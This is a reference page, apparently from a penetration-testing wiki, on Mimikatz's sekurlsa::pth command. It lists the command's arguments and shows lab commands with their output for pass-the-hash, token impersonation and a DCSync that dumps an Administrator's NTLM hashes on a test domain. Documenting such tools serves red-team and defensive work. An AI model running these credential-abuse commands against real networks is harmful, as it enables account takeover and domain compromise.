# pth

`sekurlsa::pth` performs [Pass-the-Hash](https://www.thehacker.recipes/ad/movement/ntlm/pth), [Pass-the-Key](https://www.thehacker.recipes/ad/movement/kerberos/ptk) and [Over-Pass-the-Hash](https://www.thehacker.recipes/ad/movement/kerberos/opth). Upon successful authentication, a program is run (n.b. defaulted to `cme.exe`). It has the following command line arguments:

* `/user` : the username to impersonate. It must be noted that Administrator is not the only name for this well-known account.
* `/domain` : the fully qualified domain name. If Active Directory domain services are not in use or in case of local user/admin, a computer or a server name, `workgroup` can be used.
* `/rc4` or `/ntlm` : the RC4 key / NT hash (derived of the user's password).
* `/aes128` : the AES128 key derived from the user's password and the realm of the domain.
* `/aes256` : the AES256 key derived from the user's password and the realm of the domain.
* `/run` : the command line to run (defaulted to `cmd.exe`).
* `/luid` : locally unique identifier. According to Microsoft, the [locally unique identifier (LUID)](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/igpupvdev/ns-igpupvdev-\_luid) is a 64-bit value guaranteed to be unique only on the system on which it was generated. The uniqueness of an LUID is guaranteed only until the system is restarted.
* `/impersonate` : It performs [user token impersonation](pth.md#with-token-impersonation). It must be noted that a new process is not spawned but the token is injected on the process running Mimikatz.

{% hint style="info" %}
LM and NT hashes are used to authenticate accounts using the NTLM protocol. These hashes are often called NTLM hash and many documentations, resources, blogpost and tools mix terms. In this case, "ntlm" refers to the NT hash.

([more information](https://www.thehacker.recipes/ad/movement/ntlm))
{% endhint %}

{% hint style="warning" %}
Doing [Pass-the-Hash](https://www.thehacker.recipes/ad/movement/ntlm/pth) on a Windows system requires specific privilege. It either requires elevated privileges (by previously running [`privilege::debug`](../privilege/debug.md) or by executing Mimikatz as the `NT-AUTHORITY\SYSTEM` account). This doesn't apply to [Pass-The-Ticket](https://www.thehacker.recipes/ad/movement/kerberos/ptt) which uses an official API.
{% endhint %}

```
mimikatz # sekurlsa::pth /user:Administrator /domain:hacklab.local /ntlm:b09a14d2d325026f8986d4a874fbcbc7
user    : Administrator
domain  : hacklab.local
program : cmd.exe
impers. : no
NTLM    : b09a14d2d325026f8986d4a874fbcbc7
  |  PID  5896
  |  TID  4620
  |  LSA Process is now R/W
  |  LUID 0 ; 82772120 (00000000:04ef0098)
  \_ msv1_0   - data copy @ 0000023A0E8BD5C0 : OK !
  \_ kerberos - data copy @ 0000023A0E9FF5A8
   \_ des_cbc_md4       -> null
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ *Password replace @ 0000023A0E941CE8 (32) -> null
```

![Pass the Hash](<../../../.gitbook/assets/2 (3).png>)

### With token impersonation

As can be seen in the following output the `hacklab\optimus` user is a low privileged user in the `HACKLAB.LOCAL` active directory domain:

```
C:\Users\optimus>net user optimus /domain
The request will be processed at a domain controller for domain hacklab.local.

User name                    optimus
Full Name                    optimus prime
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            18/10/2021 15:39:30
Password expires             Never
Password changeable          19/10/2021 15:39:30
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   18/10/2021 15:56:39

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users
The command completed successfully.
```

An attempt to [DCSync](https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync) with his credentials will result in the following:

```
mimikatz # lsadump::dcsync /user:Administrator
[DC] 'hacklab.local' will be the domain
[DC] 'DC.hacklab.local' will be the DC server
[DC] 'Administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
ERROR kuhl_m_lsadump_dcsync ; GetNCChanges: 0x000020f7 (8439)
```

However, by using the `/impersonate` option, [DCSync](https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync) can be performed without spawning a new window:

```
mimikatz # sekurlsa::pth /user:Administrator /domain:hacklab.local /ntlm:b09a14d2d325026f8986d4a874fbcbc7 /impersonate
user    : Administrator
domain  : hacklab.local
program : C:\Users\Public\x64\mimikatz.exe
impers. : yes
NTLM    : b09a14d2d325026f8986d4a874fbcbc7
  |  PID  7368
  |  TID  3204
  |  LSA Process is now R/W
  |  LUID 0 ; 86889532 (00000000:052dd43c)
  \_ msv1_0   - data copy @ 0000023A0E8BD7B0 : OK !
  \_ kerberos - data copy @ 0000023A0E9FE8E8
   \_ des_cbc_md4       -> null
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ *Password replace @ 0000023A0E96C0E8 (32) -> null
** Token Impersonation **
```

```
mimikatz # lsadump::dcsync /user:Administrator
[DC] 'hacklab.local' will be the domain
[DC] 'DC.hacklab.local' will be the DC server
[DC] 'Administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000200 ( NORMAL_ACCOUNT )
Account expiration   : 01/01/1601 01:00:00
Password last change : 24/09/2021 16:24:41
Object Security ID   : S-1-5-21-2725560159-1428537199-2260736313-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: b09a14d2d325026f8986d4a874fbcbc7
    ntlm- 0: b09a14d2d325026f8986d4a874fbcbc7
    ntlm- 1: a06b19f88e0432e937a67fb6848e56bd

...Output Omitted...
```

According to Benjamin the following must be taken into consideration:

* This command does not work with minidumps (nonsense)
* this new version of 'Pass-The-Hash' replaces RC4 keys of Kerberos by the NT hash (and/or replaces AES keys). It allows the Kerberos provider to ask TGT tickets.
* NT hash is mandatory on XP/2003/Vista/2008 and before 7/2008r2/8/2012 kb2871997 (AES not available or replaceable)
* AES keys can be replaced only on 8.1/2012r2 or 7/2008r2/8/2012 with kb2871997, in this case an NT hash is not required.
